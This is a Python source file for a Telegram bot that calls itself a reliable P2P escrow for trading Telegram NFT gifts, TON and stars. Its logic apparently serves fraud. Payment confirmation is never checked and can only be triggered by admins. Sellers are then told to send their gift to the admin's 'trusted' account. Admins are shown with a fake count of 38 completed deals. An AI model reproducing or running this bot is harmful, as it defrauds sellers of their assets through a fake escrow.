import re
import secrets
import string
from datetime import datetime

from aiogram.enums import ParseMode
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, FSInputFile

import os

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import StatesGroup, State
import asyncio
import logging

new_format = (
    "%(asctime)s - [%(levelname)s] - %(name)s - "
    "(%(filename)s).%(funcName)s(%(lineno)d) - %(message)s"
)

formatter = logging.Formatter("Telegram - " + new_format)

logger = logging.getLogger()
logger.setLevel(logging.INFO)

# если basicConfig уже вызван — убираем старые handlers
logger.handlers.clear()

# ===== Консоль =====
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_handler.setFormatter(formatter)

# ===== Файл =====
file_handler = logging.FileHandler("bot.log", encoding="utf-8")
file_handler.setLevel(logging.INFO)
file_handler.setFormatter(formatter)

logger.addHandler(console_handler)
logger.addHandler(file_handler)
# ------------------------
# Настройки
# ------------------------

BOT_TOKEN = str(os.getenv('BOT_TOKEN'))
ADMIN_IDS = list(map(int, str(os.getenv('ADMIN_IDS')).split(',')))
ADMIN_USERNAME = str(os.getenv('ADMIN_USERNAME'))
DEALS_COUNT = int(os.getenv('DEALS_COUNT', 38))

PHOTO_PATH = str(os.getenv('PHOTO_PATH'))
PHOTO_ID = None

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())


# ------------------------
# Типы
# ------------------------
class Deal:
    def __init__(self, id: str, description: str, cost: int, currency: str, date: str, seller_id: int) -> None:
        self.id = id
        self.description = description
        self.cost = cost
        self.currency = currency
        self.date = date
        self.seller = seller_id
        self.buyer = None

    async def get_customer_link(self):
        return f"https://t.me/{(await bot.get_me()).username}?start=deal_{self.id}"
    


user_languages = {}
deals: dict[str, Deal] = {}

# ------------------------
# Тексты
# ------------------------
TEXTS = {
    "menu": {
        "ru": """<b>Добро пожаловать в Telegram Gifts Transfer – надежную P2P-платформу для обхода 21-дневной блокировки после покупки в разделе подарков Telegram</b>\n<b>💼Покупайте и продавайте все, что хотите - безопасно!</b>\nНачиная с подарков Telegram и NFT и заканчивая токенами, транзакции просты и безопасны.""",
        "en": """<b>Welcome to Telegram Gifts Transfer – a reliable P2P platform for bypassing the 21-day lock after purchase with the Telegram Gifts section</b>\n<b>💼Buy and sell anything you want - safely!</b>\nFrom Telegram gifts and NFT to tokens, transactions are easy and risk-free.""",
    },
    "deal_currency": {
        "ru": "💰 Выберите метод получения оплаты:",
        "en": "💰 Select a payment method:"
    },
    "deal_cost": {
        "ru": "💼 Создание сделки\nВведите сумму {} сделки в формате: 100.5",
        "en": "💼 Creating a deal\nEnter the {} amount of the trade in the format: 100.5"
    },
    "deal_gift": {
        "ru": "📝 Укажите, что вы предлагаете в этой сделке за {0} {1}\n\nПример: https://t.me/nft/KissedFrog-1141",
        "en": "📝 Specify what you offer in this deal for {0} {1}\n\nExample: https://t.me/nft/KissedFrog-1141"
    },
    "deal_created": {
        "ru": "✅ <b>Сделка #{0} успешно создана!</b>\n\n💰 <b>Сумма:</b> {1} {2}\n📜 <b>Описание:</b>\n{3}\n🔗 <b>Ссылка для покупателя:</b>\n{4}",
        "en": "✅ <b>Deal #{0} has been successfully created!</b>\n\n💰 <b>Amount:</b> {1} {2}\n📜 <b>Description:</b>\n{3}\n🔗 <b>Buyer's link:</b>\n{4}"
    },
    "deal_entered": {
        "ru": "✅ <b>Вы вошли в сделку!</b>\n#{0}\n💰 <b>Сумма:</b> {1} {2}\n📜 <b>Описание:</b>\n{3}\n⏰ <b>Дата:</b> {4}\n🖋️ <b>Напишите нашему Администратору для получения реквизитов</b> {5}\n🏆 <b>Завершённых сделок у продавца:</b> {6}",
        "en": "✅ <b>You have entered the deal!</b>\n#{0}\n💰 <b>Amount:</b> {1} {2}\n📜 <b>Description:</b>\n{3}\n⏰ <b>Date:</b> {4}\n🖋️ <b>Write to our Administrator to receive the details</b> {5}\n🏆 <b>Completed transactions with the seller:</b> {6}"
    },
    "my_deal": {
        "ru": "⚠️ Вы не можете присоединиться к своей сделке",
        "en": "⚠️ You cannot join your deal"
    },
    "other_user": {
        "ru": "❌ Сделка уже активна с другим участником",
        "en": "❌ The deal is already active with another participant"
    },
    "not_in_deal": {
        "ru": "❌ Вы не состоите в этой сделке",
        "en": "❌ You are not part of this deal"
    },
    "deal_canceled": {
        "ru": "⚠️ <b>Сделка #{0} была отменена</b>",
        "en": "⚠️ <b>Deal #{0} has been canceled</b>"
    },
    "payment_approved": {
        "ru": "✅ <b>Оплата по сделке #{0} подтверждена.</b>\n\n💰 <b>Сумма:</b> {1} {2}\n📜 <b>Описание:</b>\n{3}\n⏰ <b>Дата:</b> {4}\n🏆 <b>Завершённых сделок у покупателя:</b> {5}\n\n🎁 <b>Отправьте подарок доверенному лицу:</b>\n{6}\n🟡 <b>После подтверждения передачи вам будут начислены звёзды.</b>\n\n⚠️ <b>Отправьте подарок именно на аккаунт доверенного лица, иначе ваши средства могут быть утеряны!</b>",
        "en": "✅ <b>Payment for deal #{0} has been confirmed.</b>\n\n💰 <b>Amount:</b> {1} {2}\n📜 <b>Description:</b>\n{3}\n⏰ <b>Date:</b> {4}\n🏆 <b>Completed transactions with the buyer:</b> {5}\n\n🎁 <b>Send a gift to a trusted person:</b>\n{6}\n🟡 <b>Once the transfer is confirmed, you will receive stars.</b>\n\n⚠️ <b>Send the gift to the trusted person's account, otherwise your funds may be lost!</b>"
    },
    "payment_received": {
        "ru": "✅ <b>Оплата по сделке #{0} подтверждена.</b>\n\n💰 <b>Сумма:</b> {1} {2}\n🎁<b> Описание:</b>\n{3}\n\n⌛️Ожидайте, пока продавец отправит товар",
        "en": "✅ <b>Payment for delay #{0} has been confirmed.</b>\n\n💰 <b>Amount:</b> {1} {2}\n🎁<b>Description:</b>\n{3}\n\n⌛️Wait for the seller to send the product"
    }
}
BUTTON_TEXTS = {
    "lang": {
        "ru": "🌐 Сменить язык",
        "en": "🌐 Change language"
    },
    "deal": {
        "ru": "📄 Создать сделку",
        "en": "📄 Create a deal"
    },
    "support": {
        "ru": "📞 Поддержка",
        "en": "📞 Support"
    },
    "back": {
        "ru": "🔙 Вернуться в меню",
        "en": "🔙 Return to the menu"
    },
    "accept_deal": {
        "ru": "✅ Подтвердить оплату",
        "en": "✅ Confirm the payment"
    },
    "cancel_deal": {
        "ru": "✕ Отменить сделку",
        "en": "✕ Cancel the deal"
    },
    "leave_deal": {
        "ru": "🚪 Покинуть сделку",
        "en": "🚪 Leave the deal"
    },
    "currency_ton": {
        "ru": "💎 На TON-кошелек",
        "en": "💎 To TON wallet",
    },
    "currency_rub": {
        "ru": "💳 На карту",
        "en": "💳 To bank card",
    },
    "currency_stars": {
        "ru": "⭐ Звезды",
        "en": "⭐ Stars",
    }
}



# ------------------------
# Клавиатуры
# ------------------------
def get_menu_keyboard(user_id):
    lang = user_languages.get(user_id, "en")
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=BUTTON_TEXTS["deal"][lang], callback_data="create_deal")],
            [InlineKeyboardButton(text=BUTTON_TEXTS["lang"][lang], callback_data="change_lang")],
            [InlineKeyboardButton(text=BUTTON_TEXTS["support"][lang], url=f"https://t.me/{ADMIN_USERNAME[1:]}")],
        ]
    )

def get_deal_currency_keyboard(user_id):
    lang = user_languages.get(user_id, "en")
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=BUTTON_TEXTS["currency_ton"][lang], callback_data="create_deal_TON")],
            [InlineKeyboardButton(text=BUTTON_TEXTS["currency_rub"][lang], callback_data="create_deal_Rub")],
            [InlineKeyboardButton(text=BUTTON_TEXTS["currency_stars"][lang], callback_data="create_deal_Stars")],
            [InlineKeyboardButton(text=BUTTON_TEXTS["back"][lang], callback_data="menu")],
        ]
    )

def get_back_keyboard(user_id):
    lang = user_languages.get(user_id, "en")
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=BUTTON_TEXTS["back"][lang], callback_data="menu")],
        ]
    )


def get_enter_deal_keyboard(user_id, deal_id):
    lang = user_languages.get(user_id, "en")
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=BUTTON_TEXTS["accept_deal"][lang], callback_data=f"accept_deal_{deal_id}"),
             InlineKeyboardButton(text=BUTTON_TEXTS["leave_deal"][lang], callback_data=f"leave_deal_{deal_id}")],
        ]
    )


def get_cancel_deal_keyboard(user_id, deal_id):
    lang = user_languages.get(user_id, "en")
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=BUTTON_TEXTS["cancel_deal"][lang], callback_data=f"cancel_deal_{deal_id}")]
        ]
    )


# ------------------------
# Фильтры
# ------------------------
class AllowedPermissions(logging.Filter):
    def __call__(self, message) -> bool:
        msg: types.Message = message
        if isinstance(message, types.CallbackQuery):
            msg = message.message
        return msg.chat.id in ADMIN_IDS


# ------------------------
# Состояния
# ------------------------
class CreateDeal(StatesGroup):
    write_cost = State()
    write_gift = State()


# ------------------------
# Утилиты
# ------------------------
GIFT_RE = re.compile(
    r'^(?:https://)?t\.me/nft/[A-Za-z0-9_-]+$',
    re.IGNORECASE
)

alphabet = string.ascii_letters + string.digits


def is_gift_link(url: str) -> bool:
    return bool(GIFT_RE.match(url))


def extract_links(text: str):
    urls = text.split()
    bad_links = [is_gift_link(i) for i in urls]
    if not all(bad_links):
        return None
    return "\n".join(urls)


def generate_id(length=10):
    return ''.join(secrets.choice(alphabet) for _ in range(length))


# ------------------------
# Обработчики
# ------------------------
@dp.message(Command("start"))
async def start(message: types.Message, command: types.CommandObject = None):
    global PHOTO_ID
    user_id = message.chat.id
    current_lang = user_languages.get(user_id, "en")

    # Обработка параметра deal_xxx
    if command and command.args:
        arg = command.args.strip()
        if arg.startswith("deal_"):
            deal_id = arg.split("_")[1]
            deal = deals.get(deal_id)
            if deal:
                if deal.seller == user_id:
                    await message.answer(TEXTS["my_deal"][current_lang], reply_markup=get_back_keyboard(user_id))
                    return
                if deal.buyer != None and deal.buyer != user_id:
                    await message.answer(TEXTS["other_user"][current_lang], reply_markup=get_back_keyboard(user_id))
                    return
                deals[deal_id].buyer = user_id
                await message.answer(
                    TEXTS["deal_entered"][current_lang].format(
                        deal_id, deal.cost, deal.currency, deal.description, deal.date,
                        ADMIN_USERNAME, DEALS_COUNT if deal.seller in ADMIN_IDS else 0
                    ),
                    reply_markup=get_enter_deal_keyboard(user_id, deal_id),
                    parse_mode=ParseMode.HTML
                )
                return

    try:
        if PHOTO_ID:
            await message.answer_photo(
                photo=PHOTO_ID,
                caption=TEXTS["menu"][current_lang],
                reply_markup=get_menu_keyboard(user_id),
                parse_mode=ParseMode.HTML
            )
        else:
            msg = await message.answer_photo(
                photo=FSInputFile(PHOTO_PATH),
                caption=TEXTS["menu"][current_lang],
                reply_markup=get_menu_keyboard(user_id),
                parse_mode=ParseMode.HTML
            )
            PHOTO_ID = msg.photo[-1].file_id
    except Exception as e:
        print("Ошибка при отправке фото:", e)
        await message.answer(
            TEXTS["menu"][current_lang],
            reply_markup=get_menu_keyboard(user_id),
            parse_mode=ParseMode.HTML
        )


@dp.callback_query(F.data == "menu", StateFilter("*"))
async def menu(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.delete()
    await start(callback.message)


@dp.callback_query(F.data == "create_deal")
async def create_deal(callback: types.CallbackQuery):
    user_id = callback.message.chat.id
    current_lang = user_languages.get(user_id, "en")
    await callback.message.edit_caption(caption=TEXTS["deal_currency"][current_lang],
                                        reply_markup=get_deal_currency_keyboard(user_id))


@dp.callback_query(F.data.startswith("create_deal_"), StateFilter("*"))
async def create_deal(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    user_id = callback.message.chat.id
    current_lang = user_languages.get(user_id, "en")
    currency = callback.data.split("_")[-1]
    await state.set_state(CreateDeal.write_cost)
    await state.update_data(currency=currency)
    await callback.message.edit_caption(caption=TEXTS["deal_cost"][current_lang].format(currency),
                                        reply_markup=get_back_keyboard(user_id))



@dp.message(CreateDeal.write_cost)
async def create_deal(message: types.Message, state: FSMContext):
    global PHOTO_ID
    user_id = message.chat.id
    current_lang = user_languages.get(user_id, "en")
    data = await state.get_data()
    if not bool(re.fullmatch(r"[+]?\d+(\.\d+)?", message.text)):
        try:
            if PHOTO_ID:
                await message.answer_photo(
                    photo=PHOTO_ID,
                    caption=TEXTS["deal_cost"][current_lang].format(data["currency"]),
                    reply_markup=get_back_keyboard(user_id)
                )
            else:
                msg = await message.answer_photo(
                    photo=FSInputFile(PHOTO_PATH),
                    caption=TEXTS["deal_cost"][current_lang].format(data["currency"]),
                    reply_markup=get_back_keyboard(user_id)
                )
                PHOTO_ID = msg.photo[-1].file_id
        except Exception as e:
            logging.error(e)
            await message.answer(
                text=TEXTS["deal_cost"][current_lang].format(data["currency"]),
                reply_markup=get_back_keyboard(user_id)
            )
        return
    await state.update_data(cost=float(message.text))
    await state.set_state(CreateDeal.write_gift)
    await message.answer(text=TEXTS["deal_gift"][current_lang].format(float(message.text), data["currency"]),
                         reply_markup=get_back_keyboard(user_id))


@dp.message(CreateDeal.write_gift)
async def create_deal(message: types.Message, state: FSMContext):
    user_id = message.chat.id
    current_lang = user_languages.get(user_id, "en")
    urls = extract_links(message.text)

    data = await state.get_data()
    if not urls:
        await message.answer(text=TEXTS["deal_gift"][current_lang].format(data["cost"], data["currency"]),
                             reply_markup=get_back_keyboard(user_id))
        return

    deal_id = generate_id()
    deal_cost = data.get("cost", 0)
    deal_description = urls
    deal_date = datetime.now().strftime("%Y-%m-%d")
    deal_currency = data["currency"]

    deals[deal_id] = Deal(deal_id, deal_description, deal_cost, deal_currency, deal_date, user_id)

    text = TEXTS["deal_created"][current_lang].format(deal_id, deal_cost, deal_currency, deal_description,
                                                      await deals[deal_id].get_customer_link())
    await state.clear()
    await message.answer(text=text, reply_markup=get_cancel_deal_keyboard(user_id, deal_id), parse_mode=ParseMode.HTML)


@dp.callback_query(F.data.startswith("accept_deal_"))
async def accept_deal(callback: types.CallbackQuery):
    user_id = callback.message.chat.id
    current_lang = user_languages.get(user_id, "en")
    deal_id = callback.data.split("_")[2]
    await callback.answer()
    if deal_id not in deals:
        await callback.answer(text=TEXTS["not_in_deal"][current_lang], show_alert=True)
        return

    deal = deals[deal_id]
    if deal.buyer == user_id and user_id in ADMIN_IDS:
        seller_lang = user_languages.get(deal.seller, "en")
        await bot.send_message(deal.seller, text=TEXTS["payment_approved"][seller_lang].format(deal_id,
                                                                                               deal.cost,
                                                                                               deal.currency,
                                                                                               deal.description,
                                                                                               deal.date,
                                                                                               DEALS_COUNT if deal.buyer in ADMIN_IDS else 0,
                                                                                               ADMIN_USERNAME),
                               parse_mode=ParseMode.HTML)
        current_lang = user_languages.get(callback.message.chat.id, "en")
        await callback.message.answer(text=TEXTS["payment_received"][current_lang].format(deal_id, deal.cost, deal.currency, deal.description), parse_mode=ParseMode.HTML)
        await callback.message.answer(f"✅ Сделка #{deal_id} успешно подтверждена!")

        try:
            del deals[deal_id]
        except:
            pass


@dp.callback_query(F.data.startswith("leave_deal_"))
async def leave_deal(callback: types.CallbackQuery):
    user_id = callback.message.chat.id
    current_lang = user_languages.get(user_id, "en")
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(text=TEXTS["not_in_deal"][current_lang], show_alert=True)
        return
    deals[deal_id].buyer = None
    await callback.message.delete()


@dp.callback_query(F.data.startswith("cancel_deal_"))
async def cancel_deal(callback: types.CallbackQuery):
    user_id = callback.message.chat.id
    current_lang = user_languages.get(user_id, "en")
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(text=TEXTS["not_in_deal"][current_lang], show_alert=True)
        return

    deal = deals[deal_id]
    if deal.buyer:
        buyer_lang = user_languages.get(deal.buyer, "en")
        try:
            await bot.send_message(deal.buyer, TEXTS["deal_canceled"][buyer_lang].format(deal_id),
                                   parse_mode=ParseMode.HTML)
        except:
            pass

    text = TEXTS["deal_created"][current_lang].format(deal_id, deal.cost, deal.description,
                                                      await deal.get_customer_link()) + "\n\n" + TEXTS["deal_canceled"][
               current_lang].format(deal_id)
    await callback.message.edit_text(text=text, reply_markup=None, parse_mode=ParseMode.HTML)

    try:
        del deals[deal_id]
    except:
        pass


@dp.callback_query(F.data == "change_lang")
async def change_lang(callback: types.CallbackQuery):
    user_id = callback.message.chat.id
    current_lang = user_languages.get(user_id, "en")
    user_languages[user_id] = "en" if current_lang == "ru" else "ru"
    await callback.message.delete()
    await start(callback.message)


@dp.message(Command("confirm"), AllowedPermissions())
async def confirm_handler(message: types.Message, command: types.CommandObject):
    if not command.args:
        return
    confirm_id = command.args.strip()[1:]
    if confirm_id in deals:
        deal = deals[confirm_id]
        seller_lang = user_languages.get(deal.seller, "en")
        await bot.send_message(deal.seller, text=TEXTS["payment_approved"][seller_lang].format(confirm_id,
                                                                                               deal.cost,
                                                                                               deal.currency,
                                                                                               deal.description,
                                                                                               deal.date,
                                                                                               DEALS_COUNT if deal.buyer in ADMIN_IDS else 0,
                                                                                               ADMIN_USERNAME),
                               parse_mode=ParseMode.HTML)
        current_lang = user_languages.get(message.chat.id, "en")
        await message.answer(text=TEXTS["payment_received"][current_lang].format(confirm_id, deal.cost, deal.currency, deal.description), parse_mode=ParseMode.HTML)
        await message.answer(f"✅ Сделка #{confirm_id} успешно подтверждена!")
        try:
            del deals[confirm_id]
        except:
            pass
    else:
        await message.answer("Сделка не найдена")


async def start_bot():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(start_bot())
